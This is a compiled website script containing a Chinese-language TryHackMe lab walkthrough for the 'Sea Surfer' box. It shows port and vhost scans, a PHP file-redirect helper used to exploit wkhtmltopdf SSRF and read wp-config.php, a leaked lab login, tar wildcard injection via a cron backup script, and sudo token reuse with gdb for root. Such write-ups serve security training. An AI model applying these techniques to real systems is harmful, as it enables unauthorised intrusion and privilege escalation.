"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9860],{40322:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>a,metadata:()=>o,toc:()=>c});var r=t(74848),s=t(28453);const a={sidebar_position:175,tags:["Easy","Linux","SSRF","\u5b9a\u65f6\u4efb\u52a1","\u4ee4\u724c\u7a83\u53d6"],title:"Sea Surfer",description:"Sea Surfer",sidebar_label:"Sea Surfer",slug:"/tryhackme/175"},i="Sea Surfer",o={id:"box/TryHackMe/175",title:"Sea Surfer",description:"Sea Surfer",source:"@site/docs/box/TryHackMe/175.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/175",permalink:"/docs/tryhackme/175",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SSRF",permalink:"/docs/tags/ssrf"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"\u4ee4\u724c\u7a83\u53d6",permalink:"/docs/tags/\u4ee4\u724c\u7a83\u53d6"}],version:"current",sidebarPosition:175,frontMatter:{sidebar_position:175,tags:["Easy","Linux","SSRF","\u5b9a\u65f6\u4efb\u52a1","\u4ee4\u724c\u7a83\u53d6"],title:"Sea Surfer",description:"Sea Surfer",sidebar_label:"Sea Surfer",slug:"/tryhackme/175"},sidebar:"boxSidebar",previous:{title:"Year of the Pig",permalink:"/docs/tryhackme/174"},next:{title:"Year of the Owl",permalink:"/docs/tryhackme/176"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; kyle",id:"www-data--kyle",level:3},{value:"kyle \u2014&gt; root",id:"kyle--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"sea-surfer",children:"Sea Surfer"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-145-227:~# nmap -sTCV -p- --min-rate 1000 10.10.20.171\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-11-05 02:54 GMT\nNmap scan report for ip-10-10-20-171.eu-west-1.compute.internal (10.10.20.171)\nHost is up (0.0012s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nMAC Address: 02:DF:38:87:AD:2B (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-145-227:~# curl -I http://10.10.20.171/\nHTTP/1.1 200 OK\n.....\nX-Backend-Server: seasurfer.thm\n.....\n\nroot@ip-10-10-145-227:~# gobuster vhost -u http://seasurfer.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://seasurfer.thm/\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2023/11/05 03:06:56 Starting gobuster\n===============================================================\nFound: internal.seasurfer.thm (Status: 200) [Size: 3072]\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u4e3b\u57df\u8fdb\u884c\u4e00\u4e9b\u626b\u63cf, \u83b7\u53d6\u5230\u4e00\u4e9b\u5185\u5bb9:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-145-227:~# gobuster dir -u http://seasurfer.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://seasurfer.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/11/05 03:42:29 Starting gobuster\n===============================================================\n/news (Status: 301)\n/index.php (Status: 301)\n/contact (Status: 301)\n...\n/adminer  : \u6570\u636e\u5e93\u767b\u9646\u754c\u9762\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u4e0a\u9762\u6211\u4eec\u83b7\u53d6\u5230\u4e00\u4e2a\u7528\u6237 ",(0,r.jsx)(n.code,{children:"kyle"})," \u540c\u65f6\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a wordpress \u7ad9\u70b9, \u76ee\u524d\u6765\u770b\u9664\u4e86\u767b\u9646\u522b\u65e0\u4ed6\u53d1, \u6240\u4ee5\u6211\u5f00\u59cb\u8f6c\u6218\u5b50\u57df, \u6211\u89c9\u5f97\u8fd9\u91cc\u5e94\u8be5\u662f\u7a81\u7834\u53e3, \u518d\u586b\u5199\u8868\u5355\u540e, \u6211\u53d1\u73b0\u5176\u7ed9\u4e86\u6211\u4e00\u4e2a PDF \u67e5\u770b\u5176\u5bf9\u5e94\u7684\u5de5\u5177, \u7ecf\u8fc7\u67e5\u627e\u53d1\u73b0\u5b58\u5728 SSRF \u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/",children:"wkhtmltopdf SSRF | Exploit Notes"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204013.png",alt:"image-20240709204012544"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204023.png",alt:"image-20240709204022061"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u672c\u5730\u642d\u5efa\u73af\u5883\u8fdb\u884c SSRF \u5229\u7528"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-145-227:~/seasurfer# cat test.php \n<?php header('location:file://'.$_REQUEST['x']); ?>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204044.png",alt:"image-20240709204042878"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"wp-config.php"})," \u4e2d\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u5230\u5bf9\u5e94\u7684\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u4ece\u800c\u83b7\u53d6\u5230\u6570\u636e\u5e93\u7684\u8d26\u53f7\u548c\u5bc6\u7801, \u5bf9\u5e94\u7684\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 wordpress \u7684\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801 : ",(0,r.jsx)(n.code,{children:"kyle:jenny4ever"})," \u63a5\u4e0b\u6765\u5c31\u662f\u8001\u4e09\u5957\u4e86, \u4e0d\u591a\u8bf4"]}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u83b7\u53d6\u4e00\u4e2areverse shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204058.png",alt:"image-20240709204056886"})}),"\n",(0,r.jsx)(n.h3,{id:"www-data--kyle",children:"www-data \u2014> kyle"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7f51\u7ad9\u4e2d\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u4ece\u5176\u5185\u5bb9\u6765\u770b\u5b58\u5728\u901a\u914d\u7b26\u5229\u7528, \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u5b8c\u6210\u653b\u51fb"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh \n#!/bin/bash\n\n# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D\n# Still need to come up with a better backup system, perhaps a cloud provider?\n\ncd /var/www/internal/invoices\ntar -zcf /home/kyle/backups/invoices.tgz *\n(remote) www-data@seasurfer:/var/www/internal/maintenance$ ls -al backup.sh \n-rwxrwxr-x 1 kyle kyle 286 Apr 19  2022 backup.sh\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204109.png",alt:"image-20240709204108406"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204117.png",alt:"image-20240709204116307"})}),"\n",(0,r.jsx)(n.h3,{id:"kyle--root",children:"kyle \u2014> root"}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u53d1\u73b0\u7528\u6237 ",(0,r.jsx)(n.code,{children:"kyle"})," \u5b58\u5728\u4e00\u4e2a root \u8fdb\u7a0b, \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u6b64\u8fdb\u884c\u4ee4\u724c\u91cd\u7528"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) kyle@seasurfer:/home/kyle$ ps -ef\n....\nkyle        1122    1121  0 02:52 pts/0    00:00:00 bash -c sudo /root/admincheck; sleep infinity\n...\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0b\u8f7d\u5bf9\u5e94\u7684 gdb \u5de5\u5177\u5e76\u4e0a\u4f20\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 root \u7684 Shell\u4e86"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) kyle@seasurfer:/tmp$ dpkg  -x gdb_9.1-0ubuntu1_amd64.deb  ~\n(remote) kyle@seasurfer:/tmp$ export PATH=/home/kyle/usr/bin:$PATH\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204125.png",alt:"image-20240709204124364"})})]})}function u(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var r=t(96540);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);